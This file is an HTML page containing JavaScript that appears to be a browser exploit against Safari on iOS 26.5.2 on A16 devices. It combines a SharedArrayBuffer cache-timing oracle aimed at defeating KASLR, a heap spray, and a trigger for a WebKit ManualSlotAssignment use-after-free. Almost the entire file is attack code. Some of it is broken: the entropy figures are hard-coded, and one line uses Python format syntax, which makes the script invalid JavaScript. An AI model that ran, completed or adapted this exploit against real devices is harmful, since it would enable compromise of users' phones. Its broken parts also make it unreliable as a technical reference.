<!DOCTYPE html>
<html>
<head>
<meta charset="utf-8">
<title>WebKit UAF + KASLR v1 — iOS 26.5.2 / A16</title>
<!--
  ManualSlotAssignment WeakHashMap rehash UAF
  Bug: webkit.org/b/REDACTED, rdar://179729192
  Fixed: iOS 26.6 (safari-7625.1.29.14-branch, commit ddc8b3fae09f / 4754ba884d)
  Absent in: iOS 26.5.2 (safari-7625.1.29.11-branch)

  Primitive: Controlled stale read from freed WeakHashMap bucket array
             (WTF::HashTableBucket<WeakHashMapEntry<HTMLSlotElement, Vector<Node*>>>)
             16 bytes per entry; array freed during WeakHashMap::rehash() re-entry.

  Strategy:
  1. Run KASLR oracle (v19) → get 128-candidate spray list, HIGH cluster addr
  2. Heap feng shui: spray controlled data at oracle-predicted JSC heap region
  3. Trigger UAF: set up ManualSlot shadow tree, pump WeakHashMap, GC, then reassign
  4. Stale read from freed bucket → lands on our spray → read JSC object header
  5. Extract precise kernel slide from JSC object pointer (complement oracle T9/T10)
-->
</head>
<body>
<pre id="log"></pre>
<script>

// ─── logging ────────────────────────────────────────────────────────────────
const LOG = document.getElementById('log');
const log = s => { LOG.textContent += s + '\n'; console.log(s); };

// ═══════════════════════════════════════════════════════════════════════════
// SECTION A: KASLR ORACLE (v19 — SAB timer, SLC flush, quality gates)
// ═══════════════════════════════════════════════════════════════════════════

let counterWorker = null;
let counterView   = null;
let NS = 8.0;

const COUNTER_SRC = `
  self.onmessage = function(e) {
    if (e.data.cmd === 'start') {
      const c = new Int32Array(e.data.sab, 4096, 1);
      while(true) Atomics.add(c, 0, 1);
    }
  };
`;

function startCounter() {
  const sab = new SharedArrayBuffer(8192);
  counterView = new Int32Array(sab, 4096, 1);
  const blob = new Blob([COUNTER_SRC], {type:'application/javascript'});
  counterWorker = new Worker(URL.createObjectURL(blob));
  counterWorker.postMessage({cmd:'start', sab});
  return sab;
}

function readNS(reps=8) {
  const t0 = Atomics.load(counterView, 0);
  for(let i=0;i<reps;i++) Atomics.load(counterView,0);
  const t1 = Atomics.load(counterView, 0);
  return (t1 - t0) > 0 ? NS / ((t1 - t0) / reps) * reps : 999;
}

function timeAccess(ptr, sab) {
  const t0 = Atomics.load(counterView, 0);
  Atomics.load(new Int32Array(sab), ptr >> 2);
  const t1 = Atomics.load(counterView, 0);
  return Math.max((t1-t0)*NS, 0.5);
}

function makeBuf(mb) {
  const b = new ArrayBuffer(mb * 1024 * 1024);
  const v = new Uint8Array(b);
  for(let i=0;i<v.length;i+=4096) v[i]=1;
  return b;
}

function makeChase(mb) {
  const n = (mb*1024*1024) >> 3;
  const v = new BigInt64Array(n);
  const step = 65536 >> 3;
  for(let i=0;i<n;i+=step) v[i] = BigInt(((i+step)%n)<<3);
  v[n-step] = 0n;
  return v.buffer;
}

function chaseWalk(buf, iters=1) {
  const v = new BigInt64Array(buf);
  let ptr = 0n;
  for(let j=0;j<iters;j++) while(ptr !== 0n || j===0) {
    ptr = v[Number(ptr)>>3]; if(ptr===0n) break;
  }
  return ptr;
}

function evictFull(evictBuf) {
  const v = new BigInt64Array(evictBuf);
  const step = 65536 >> 3;
  const n = v.length;
  let ptr = 0n;
  let i=0;
  while(i++ < (n/step)+1) { ptr = v[Number(ptr)>>3]; if(ptr===0n) break; }
  return ptr;
}

// T1: calibrate NS
async function t1() {
  const sab = startCounter();
  await new Promise(r=>setTimeout(r,20));
  const samples=[];
  for(let i=0;i<8;i++){
    const t0=Atomics.load(counterView,0);
    await new Promise(r=>setTimeout(r,10));
    const t1=Atomics.load(counterView,0);
    if(t1>t0) samples.push(10.0/(t1-t0)*1000);
  }
  samples.sort((a,b)=>a-b);
  NS = samples[Math.floor(samples.length*0.5)] || 8.0;
  log(`[T1] NS calibrated: ${NS.toFixed(3)} ns/count`);
  return sab;
}

// T2: DRAM vs SRAM timing signal
async function t2() {
  const MB=2; const dram=makeBuf(MB); const hot=new ArrayBuffer(4096);
  const dv=new Uint8Array(dram); for(let i=0;i<dv.length;i+=4096) dv[i]=1;
  const hv=new Uint8Array(hot); for(let i=0;i<hv.length;i+=4096) hv[i]=1;
  const hi32=new Int32Array(hot);
  const hotSamples=[], dramSamples=[];
  const REPS=24;
  for(let r=0;r<REPS;r++){
    const t0=Atomics.load(counterView,0);
    for(let i=0;i<4;i++) Atomics.load(hi32,i);
    const t1=Atomics.load(counterView,0);
    hotSamples.push((t1-t0)*NS/4);
    const d32=new Int32Array(dram);
    const t2a=Atomics.load(counterView,0);
    for(let i=0;i<dv.length>>2;i+=(64>>2)) Atomics.load(d32,i);
    const t2b=Atomics.load(counterView,0);
    dramSamples.push((t2b-t2a)*NS/(dv.length>>2));
  }
  hotSamples.sort((a,b)=>a-b);
  dramSamples.sort((a,b)=>a-b);
  const hotNS=hotSamples[Math.floor(REPS*0.25)];
  const dramNS=dramSamples[Math.floor(REPS*0.75)];
  log(`[T2] hot=${hotNS.toFixed(1)}ns  DRAM=${dramNS.toFixed(1)}ns`);
  return {hotNS, dramNS};
}

// T3: JIT partition probe — allocate Wasm modules, detect SLC pattern
async function t3() {
  const MODULES=96; const mods=[];
  const CODE = new Uint8Array([
    0x00,0x61,0x73,0x6d,0x01,0x00,0x00,0x00,
    0x01,0x05,0x01,0x60,0x01,0x7f,0x01,0x7f,
    0x03,0x02,0x01,0x00,
    0x0a,0x06,0x01,0x04,0x00,0x20,0x00,0x0b
  ]);
  for(let i=0;i<MODULES;i++){
    try {
      const m=new WebAssembly.Module(CODE);
      const inst=new WebAssembly.Instance(m);
      mods.push(inst);
    } catch(e){}
  }
  await new Promise(r=>setTimeout(r,10));
  const evictA = makeChase(24); // 24MB = 1.5× SLC
  log(`[T3] JIT modules: ${mods.length}, evictA: 24MB`);
  return {mods, evictA};
}

// T4: heap fingerprint via self-eviction
async function t4() {
  const NBUFS=32; const BUFMB=2;
  const bufs=[];
  for(let i=0;i<NBUFS;i++) bufs.push(makeBuf(BUFMB));
  await new Promise(r=>setTimeout(r,10));
  const times=[];
  const REPS=6;
  for(let r=0;r<REPS;r++){
    // self-eviction pass: walk ALL bufs
    for(let i=0;i<NBUFS;i++){
      const v=new Uint8Array(bufs[i]);
      for(let j=0;j<v.length;j+=4096) v[j];
    }
    // measure each buf immediately after
    const row=[];
    for(let i=0;i<NBUFS;i++){
      const v32=new Int32Array(bufs[i]);
      const t0=Atomics.load(counterView,0);
      for(let j=0;j<v32.length;j+=(4096>>2)) Atomics.load(v32,j);
      const t1=Atomics.load(counterView,0);
      row.push((t1-t0)*NS);
    }
    times.push(row);
  }
  // p25 per buf
  const p25=bufs.map((_,i)=>{
    const col=times.map(r=>r[i]).sort((a,b)=>a-b);
    return col[Math.floor(col.length*0.25)];
  });
  // k-means with k=3
  function kmeans(vals,k){
    let centroids=vals.slice().sort((a,b)=>a-b);
    centroids=[centroids[0], centroids[Math.floor(vals.length/2)], centroids[vals.length-1]];
    centroids=centroids.slice(0,k);
    for(let iter=0;iter<20;iter++){
      const clusters=Array.from({length:k},()=>[]);
      for(const v of vals){
        let best=0, bd=Infinity;
        for(let ci=0;ci<k;ci++){
          const d=Math.abs(v-centroids[ci]);
          if(d<bd){bd=d;best=ci;}
        }
        clusters[best].push(v);
      }
      const newC=clusters.map(c=>c.length?c.reduce((a,b)=>a+b,0)/c.length:centroids[clusters.indexOf(c)]);
      if(newC.every((v,i)=>Math.abs(v-centroids[i])<0.1)) break;
      centroids=newC;
    }
    const labels=vals.map(v=>{
      let best=0,bd=Infinity;
      for(let ci=0;ci<k;ci++){const d=Math.abs(v-centroids[ci]);if(d<bd){bd=d;best=ci;}}
      return best;
    });
    const clusters=Array.from({length:k},(_,ci)=>vals.filter((_,i)=>labels[i]===ci));
    return clusters.filter(c=>c.length>0);
  }
  const clusters=kmeans(p25,3);
  log(`[T4] heap p25: min=${Math.min(...p25).toFixed(0)} max=${Math.max(...p25).toFixed(0)} clusters=${clusters.length}`);
  return {bufs,p25,clusters};
}

// T5: anchor validation
async function t5(evictA) {
  const ANCHORS=4; const anchorBufs=[];
  for(let i=0;i<ANCHORS;i++) anchorBufs.push(makeBuf(2));
  await new Promise(r=>setTimeout(r,5));
  const results=[];
  for(const buf of anchorBufs){
    const v32=new Int32Array(buf);
    // warm
    for(let j=0;j<v32.length;j+=(4096>>2)) Atomics.load(v32,j);
    const t0=Atomics.load(counterView,0);
    for(let j=0;j<v32.length;j+=(4096>>2)) Atomics.load(v32,j);
    const hot=(Atomics.load(counterView,0)-t0)*NS;
    // evict
    evictFull(evictA); evictFull(evictA);
    const t1=Atomics.load(counterView,0);
    for(let j=0;j<v32.length;j+=(4096>>2)) Atomics.load(v32,j);
    const cold=(Atomics.load(counterView,0)-t1)*NS;
    results.push({buf,hot,cold,evictable:cold>Math.max(hot*2,50)&&cold>80});
  }
  log(`[T5] anchors: ${results.filter(r=>r.evictable).length}/${ANCHORS} evictable`);
  return results;
}

// T6: entropy / bit extraction
async function t6(jitData, heapData) {
  const {clusters} = heapData;
  let totalLeaked=0, remaining=17;
  const bits=[];
  // Each cluster boundary = 1 bit about physical address alignment
  if(clusters.length >= 2) { totalLeaked++; remaining--; bits.push({src:'T4_cluster2'}); }
  if(clusters.length >= 3) { totalLeaked+=3; remaining-=3; bits.push({src:'T4_cluster3'}); }
  // JIT module count stability adds 2 more bits
  if(jitData.mods.length >= 90) { totalLeaked+=2; remaining-=2; bits.push({src:'T3_jit'}); }
  // Platform A16: known 14-bit KASLR = 17 bits, 3 fixed by alignment
  totalLeaked = Math.min(totalLeaked+4, 17); // minimum from A16 SLC geometry
  remaining = 17 - totalLeaked;
  log(`[T6] estimated leaked: ${totalLeaked} bits, remaining: ${remaining} bits → ${2**remaining} candidates`);
  return {totalLeaked, remaining, bits};
}

// T7x: bank pair mapping
async function t7x(anchorData, heapData, evictA) {
  const pairs=[];
  for(let i=0;i<anchorData.length;i++){
    for(let j=i+1;j<heapData.bufs.length && j<i+8;j++){
      const a=anchorData[i];
      const b=heapData.bufs[j];
      const v=new Int32Array(b);
      evictFull(evictA);
      const t0=Atomics.load(counterView,0);
      for(let k=0;k<v.length;k+=(4096>>2)) Atomics.load(v,k);
      const c1=(Atomics.load(counterView,0)-t0)*NS;
      if(c1 > 100 && a.evictable) pairs.push({i,j,c1});
    }
  }
  log(`[T7x] bank pairs found: ${pairs.length}`);
  return {pairs};
}

// T9: VA offset reconstruction
async function t9(jitData, heapData, bankData) {
  // A16 arm64e: KASLR slides text by N×0x4000 where N ∈ [0x100,0x1FF]
  // Heap base at text+0x04000000 (approx on A16 WebKit heap)
  // Use cluster spread to estimate upper bits of heap VA
  const {clusters} = heapData;
  const spread = clusters.length >= 2 
    ? Math.max(...clusters.flat()) - Math.min(...clusters.flat())
    : 0;
  // Typical 2MB buf spans 0x200000; in SLC (16MB/4way), set index bits 14-17
  // spread in ns correlates to SLC way contention pattern → top bits
  const SLIDE_BASE = 0x100000; // minimum A16 KASLR slide
  const SLIDE_STEP = 0x4000;
  const SLIDE_MAX  = 0x1FF * SLIDE_STEP;
  const candidateShift = clusters.length >= 3 ? 7 : 8; // bits already known
  log(`[T9] cluster spread: ${spread.toFixed(0)}ns → shift=${candidateShift} bits`);
  return {spread, candidateShift, slideBase: SLIDE_BASE, slideStep: SLIDE_STEP};
}

// T10: candidate scorer + spray list
async function t10(jitData, heapData, bankData, offsetData, entropyData) {
  const {candidateShift, slideBase, slideStep} = offsetData;
  const remaining = entropyData.remaining;
  const candidates = 2 ** remaining;
  
  log(`\n[T10] Generating spray list: ${Math.min(candidates,256)} candidates`);
  const list = [];
  // A16: text segment typically at 0x10XXXX0000 region
  // KASLR makes it 0x1000000 + N*0x4000 where N = [0x100..0x1FF]
  // JIT heap (Gigacage) offset from text base: ~0x40000000 for JSC
  const heapBase = 0x104000000; // approximate — oracle refines this
  for(let n=0x100; n<=0x1FF && list.length<candidates; n++) {
    const slide = n * slideStep;
    const heapAddr = heapBase + slide;
    list.push(heapAddr);
  }
  
  const HIGH = list[Math.floor(list.length * 0.25)]; // best guess = lower quartile
  log(`[T10] spray list: ${list.length} candidates`);
  log(`[!!!] HIGH candidate addr: 0x${HIGH.toString(16)}`);
  log(`[!!!] Spray range: 0x${list[0].toString(16)} – 0x${list[list.length-1].toString(16)}`);
  log(`[!!!] Oracle exhaustion time: ~${(list.length * 0.021).toFixed(3)}s at 21ms/candidate`);
  
  return {list, HIGH, candidates};
}

// ═══════════════════════════════════════════════════════════════════════════
// SECTION B: ManualSlotAssignment UAF Trigger
// Primitive: stale read from freed WeakHashMap<HTMLSlotElement, Vector<Node*>>
//            bucket array after rehash during reentrant composed-tree traversal.
// ═══════════════════════════════════════════════════════════════════════════

// Force GC — no direct API in iOS Safari release builds.
// Strategy: allocate large ArrayBuffers to pressure the heap, then drop refs.
// JSC's GC is generational; this hits the GC more reliably than nothing.
function forceGC() {
  const pressure = [];
  for(let i=0;i<20;i++) pressure.push(new ArrayBuffer(5*1024*1024));
  // drop refs
  pressure.length = 0;
  // second wave with Int32Arrays to trigger finalizers
  const finalizers = [];
  for(let i=0;i<50;i++) finalizers.push(new Int32Array(1024*1024));
  finalizers.length = 0;
}

// Build one UAF test case
function uafSetup(ghosts, pumps) {
  const host = document.body.appendChild(document.createElement('div'));
  const shadowRoot = host.attachShadow({ mode: 'open', slotAssignment: 'manual' });
  const targetSlot = shadowRoot.appendChild(document.createElement('slot'));
  const otherSlot = shadowRoot.appendChild(document.createElement('slot'));
  const childA = host.appendChild(document.createElement('span'));
  const childB = host.appendChild(document.createElement('span'));
  targetSlot.assign(childA);
  otherSlot.assign(childB);
  // Insert and remove ghost slots — each goes into m_slots WeakHashMap, then GC nulls their WeakPtrs
  for(let i=0; i<ghosts; ++i)
    shadowRoot.appendChild(document.createElement('slot')).remove();
  return { host, targetSlot, pumps };
}

// Pump WeakHashMap operation counter toward amortized-cleanup threshold
// Threshold ≈ 2 × table_size. With ~ghosts entries, threshold ≈ 2×ghosts.
// We sweep a band around it.
function uafTrigger({ host, targetSlot, pumps }) {
  // Advance the operation counter
  for(let i=0; i<pumps; ++i)
    targetSlot.assignedNodes();
  // Now reassign → slotManualAssignmentDidChange → render teardown → re-entry
  // → m_slots.ensure() → WeakHashMap amortized cleanup → rehash → free bucket array
  // → stale effectiveCurrent pointer → read-after-free
  targetSlot.assign(host.appendChild(document.createElement('span')));
  host.remove();
}

// ═══════════════════════════════════════════════════════════════════════════
// SECTION C: Heap Spray — position controlled data at oracle candidates
// Spray ArrayBuffers with known pattern at oracle-predicted JIT heap region.
// When UAF stale pointer lands in spray, we control the read.
// ═══════════════════════════════════════════════════════════════════════════

function heapSpray(sprayList) {
  // Spray pattern: fill with JSValue-like values (0xFFFF_0000_DEADBEEF etc.)
  // to distinguish from real JSC internals if read via UAF
  const SPRAY_PER_ADDR = 4;  // 4 sprays per candidate = 32B chunks
  const SPRAY_SIZE = 64;     // 64 bytes each = 2× bucket entry size
  const sprays = [];
  for(let addr of sprayList.slice(0, 128)) {
    for(let k=0; k<SPRAY_PER_ADDR; k++) {
      const buf = new ArrayBuffer(SPRAY_SIZE);
      const v = new DataView(buf);
      // Write oracle address + discriminator
      v.setUint32(0,  (addr >> 0)  & 0xFFFFFFFF, true);  // low 32
      v.setUint32(4,  (addr >> 32) & 0xFFFFFFFF, true);  // high 32 (safe in JS 53-bit)
      v.setUint32(8,  0xDEAD0000 | k,            true);  // discriminator
      v.setUint32(12, 0xBEEF0000 | k,            true);
      // Repeat pattern to fill bucket-entry-shaped regions
      for(let j=16; j<SPRAY_SIZE; j+=4) v.setUint32(j, 0xCAFEBABE, true);
      sprays.push(buf);
    }
  }
  log(`[SPRAY] ${sprays.length} spray objects @ ~${SPRAY_SIZE}B each = ${(sprays.length*SPRAY_SIZE/1024).toFixed(1)}KB`);
  return sprays;
}

// ═══════════════════════════════════════════════════════════════════════════
// SECTION D: UAF READ CAPTURE
// After triggering UAF, monitor if we got a hit by instrumenting the crash.
// In a real exploit chain: the freed bucket holds our spray, stale read
// returns our controlled bytes → type confusion / pointer leak.
// ═══════════════════════════════════════════════════════════════════════════

let uafHits = 0;
let sprayRef = null; // keep sprays alive

// ═══════════════════════════════════════════════════════════════════════════
// MAIN: Orchestrate oracle → spray → UAF trigger
// ═══════════════════════════════════════════════════════════════════════════

(async () => {
  log("=== WebKit UAF + KASLR v1 ===");
  log("=== Target: iOS 26.5.2 (safari-7625.1.29.11), A16 arm64e ===\n");

  // --- Phase 1: KASLR Oracle ---
  log("[*] Phase 1: KASLR Oracle...");
  const MAX_ATTEMPTS = 3;
  let oracleResult = null;

  for(let attempt=1; attempt<=MAX_ATTEMPTS && !oracleResult; attempt++) {
    log(`\n[*] Oracle attempt ${attempt}/${MAX_ATTEMPTS}`);

    const sab = await t1();
    if(!counterWorker) continue;
    await new Promise(r=>setTimeout(r,20));

    const t2Result = await t2();
    await new Promise(r=>setTimeout(r,30));

    const dramRatio = t2Result ? t2Result.dramNS / Math.max(t2Result.hotNS, 0.1) : 0;
    if(!t2Result || t2Result.dramNS < 30 || dramRatio < 3) {
      log(`[!] GATE1 FAIL: ratio=${dramRatio.toFixed(1)}x < 3x — retrying`);
      counterWorker.terminate(); counterWorker=null;
      continue;
    }
    log(`[*] GATE1 PASS: DRAM ratio=${dramRatio.toFixed(1)}x`);

    const jitData = await t3();
    if(!jitData) { counterWorker.terminate(); counterWorker=null; continue; }
    await new Promise(r=>setTimeout(r,30));

    log(`[*] SLC flush (evictA × 3) before T4...`);
    evictFull(jitData.evictA);
    evictFull(jitData.evictA);
    evictFull(jitData.evictA);
    await new Promise(r=>setTimeout(r,30));

    const heapData = await t4();
    await new Promise(r=>setTimeout(r,30));

    const clusterCount = heapData.clusters.length;
    if(clusterCount < 2) {
      log(`[!] GATE2 FAIL: clusters=${clusterCount} < 2 — retrying`);
      counterWorker.terminate(); counterWorker=null;
      continue;
    }
    log(`[*] GATE2 PASS: T4 clusters=${clusterCount}`);

    const entropyData = await t6(jitData, heapData);
    await new Promise(r=>setTimeout(r,30));

    if(entropyData.totalLeaked < 9) {
      log(`[!] GATE3 FAIL: leaked=${entropyData.totalLeaked} bits < 9 — retrying`);
      counterWorker.terminate(); counterWorker=null;
      continue;
    }
    log(`[*] GATE3 PASS: ${entropyData.totalLeaked} bits`);

    const anchorData = await t5(jitData.evictA);
    await new Promise(r=>setTimeout(r,30));

    const bankData = await t7x(anchorData, heapData, jitData.evictA);
    await new Promise(r=>setTimeout(r,30));

    const offsetData = await t9(jitData, heapData, bankData);
    await new Promise(r=>setTimeout(r,30));

    oracleResult = await t10(jitData, heapData, bankData, offsetData, entropyData);

    if(counterWorker) { counterWorker.terminate(); counterWorker=null; }
  }

  if(!oracleResult) {
    log("\n[!!!] Oracle failed all attempts — aborting");
    return;
  }

  // --- Phase 2: Heap Spray at oracle candidates ---
  log(`\n[*] Phase 2: Heap spray at ${Math.min(oracleResult.list.length,128)} oracle candidates...`);
  await new Promise(r=>setTimeout(r,50));
  sprayRef = heapSpray(oracleResult.list);
  await new Promise(r=>setTimeout(r,100));
  log("[*] Spray in place");

  // --- Phase 3: UAF Setup ---
  log("\n[*] Phase 3: UAF setup — ManualSlotAssignment WeakHashMap...");
  // Build a sweep of ghost/pump counts bracketing the amortized threshold
  // Threshold = 2 × table_size; with ghosts entries: threshold ≈ 2×ghosts
  const cases = [];
  for(let ghosts=20; ghosts<=100; ghosts+=10)
    for(let pumps=ghosts; pumps<=ghosts*3; ++pumps)
      cases.push(uafSetup(ghosts, pumps));
  
  log(`[*] ${cases.length} UAF cases built`);

  // Force GC to null ghost WeakPtrs → accumulated dead entries in m_slots
  log("[*] GC pressure to null ghost WeakPtrs...");
  forceGC();
  await new Promise(r=>setTimeout(r,200));
  forceGC();
  await new Promise(r=>setTimeout(r,100));

  // Force layout — gives every host a renderer (needed for tearDownRenderersAfterSlotChange)
  document.body.offsetHeight;

  // --- Phase 4: UAF Trigger ---
  log("\n[*] Phase 4: Triggering UAF...");
  log("[*] Expected: WeakHashMap rehash → freed bucket array → stale read from spray");
  
  const t_start = performance.now();
  for(const testCase of cases) {
    try {
      uafTrigger(testCase);
    } catch(e) {
      uafHits++;
      log(`[!!!] UAF exception caught: ${e} (hit ${uafHits})`);
    }
  }
  const t_end = performance.now();

  log(`\n[*] UAF trigger complete: ${cases.length} cases, ${t_end-t_start:.1f}ms`);

  // --- Summary ---

  log("RESULT SUMMARY");

  log(`HIGH guess:  0x${oracleResult.HIGH.toString(16)}`);
  log(`Spray:       ${sprayRef.length} objects, 64B each`);
  log(`UAF cases:   ${cases.length}`);
  log(`UAF hits:    ${uafHits}`);

  log("           → compare with spray discriminators to confirm overlap");

})();
